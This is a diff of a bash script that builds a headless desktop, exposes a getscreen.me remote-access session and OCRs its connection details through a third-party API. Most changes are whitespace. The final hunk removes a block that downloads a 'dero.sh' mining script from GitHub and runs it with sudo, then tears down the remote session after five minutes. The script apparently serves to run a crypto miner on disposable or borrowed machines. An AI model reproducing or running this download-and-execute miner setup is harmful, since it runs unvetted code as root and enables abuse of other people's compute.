@@ -12,7 +12,7 @@ echo "[*] Installing Dependencies..."
 sudo apt update
 sudo apt install -y wget curl x11-utils imagemagick openbox xvfb jq scrot feh tint2 xfce4-terminal lxappearance pcmanfm wmctrl
 
-# --- Install Firefox ---
+# --- Install Firefox ---   
 sudo apt install software-properties-common
 sudo add-apt-repository ppa:mozillateam/ppa -y  
 sudo apt update
@@ -33,7 +33,7 @@ export DISPLAY=$XVFB_DISPLAY
 
 # --- Start Openbox ---
 echo "[*] Starting Openbox..."
-openbox-session &
+openbox-session &  
 sleep 2
 
 # --- Set wallpaper ---
@@ -71,20 +71,20 @@ fi
 
 if [[ -n "$WINDOW_ID" ]]; then
     echo "[*] Found getscreen.me window: $WINDOW_ID"
-
+    
     # Activate and raise the window
     wmctrl -i -a "$WINDOW_ID"
     sleep 2
-
+    
     # Get window geometry
     WINDOW_GEOMETRY=$(xwininfo -id "$WINDOW_ID" | grep -E "Absolute upper-left|Width|Height")
     X_POS=$(echo "$WINDOW_GEOMETRY" | grep "Absolute upper-left X" | awk '{print $4}')
     Y_POS=$(echo "$WINDOW_GEOMETRY" | grep "Absolute upper-left Y" | awk '{print $4}')
     WIDTH=$(echo "$WINDOW_GEOMETRY" | grep "Width" | awk '{print $2}')
     HEIGHT=$(echo "$WINDOW_GEOMETRY" | grep "Height" | awk '{print $2}')
-
+    
     echo "[*] Window position: ${X_POS}x${Y_POS}, Size: ${WIDTH}x${HEIGHT}"
-
+    
     # Capture screenshot of the specific window
     echo "[*] Capturing screenshot of getscreen.me window..."
     scrot -a "${X_POS},${Y_POS},${WIDTH},${HEIGHT}" "$SCREENSHOT_PATH"
@@ -116,27 +116,27 @@ if [ -n "$FULL_EXTRACTED_TEXT" ]; then
 else
     # If not found, try cropping different areas where connection info might be displayed
     echo "[*] Trying to locate connection info area..."
-
+    
     # Common areas where connection info appears (adjust based on getscreen.me UI)
     CROP_AREAS=(
-        "400x200+50+50"       # Top-left area
-        "500x300+100+100"     # Center-left area
-        "600x400+50+200"      # Lower area
-        "400x150+200+50"      # Top-center area
+        "400x200+50+50"      # Top-left area
+        "500x300+100+100"    # Center-left area  
+        "600x400+50+200"     # Lower area
+        "400x150+200+50"     # Top-center area
     )
-
+    
     FOUND_INFO=false
     for CROP in "${CROP_AREAS[@]}"; do
         echo "[*] Trying crop area: $CROP"
         convert "$SCREENSHOT_PATH" -crop "$CROP" "/tmp/test_crop.png"
-
+        
         # Test OCR on this crop
         TEST_OCR=$(curl -s -X POST "https://api.api-ninjas.com/v1/imagetotext" \
             -H "X-Api-Key: $NINJA_API_KEY" \
             -F "image=@/tmp/test_crop.png")
-
+        
         TEST_TEXT=$(echo "$TEST_OCR" | jq -r '.[] | select(.text | test("getscreen\\.me|[0-9]{3}\\.[0-9]{3}\\.[0-9]{2}")) | .text')
-
+        
         if [ -n "$TEST_TEXT" ]; then
             echo "[*] Found connection info in crop area: $CROP"
             cp "/tmp/test_crop.png" "$CROPPED_PATH"
@@ -144,7 +144,7 @@ else
             break
         fi
     done
-
+    
     if [ "$FOUND_INFO" = false ]; then
         echo "[*] Using default crop of full screenshot"
         # Default crop - adjust these values based on typical getscreen.me window layout
@@ -205,21 +205,4 @@ fi
 
 # Clean up temporary files
 rm -f /tmp/test_crop.png "$TEMP_OCR"
-
-# --- Launch the mining script and store its PID ---
-echo "[*] Launching the mining script in a new terminal..."
-xfce4-terminal -e "bash -c 'sudo curl -o try.sh https://raw.githubusercontent.com/Working-aanas/deepscreen/refs/heads/main/dero.sh && sudo chmod +x try.sh && sudo ./try.sh; exec bash'" &
-
-# --- Automated Cleanup After Mining Script Launch ---
-echo "[*] Waiting for 5 minutes after mining script launch for cleanup..."
-sleep 300 # Wait for 5 minutes (300 seconds)
-
-echo "[*] Turning off getscreen.me..."
-sudo pkill getscreen.me || true
-
-echo "[*] Turning off File Explorer (PCManFM)..."
-sudo pkill pcmanfm || true
-
-# --- Keep the main script active for 24 hours ---
-echo "[*] All tasks completed. Keeping this script active for 24 hours (86400 seconds)."
-sleep 86400
+sleep 21600
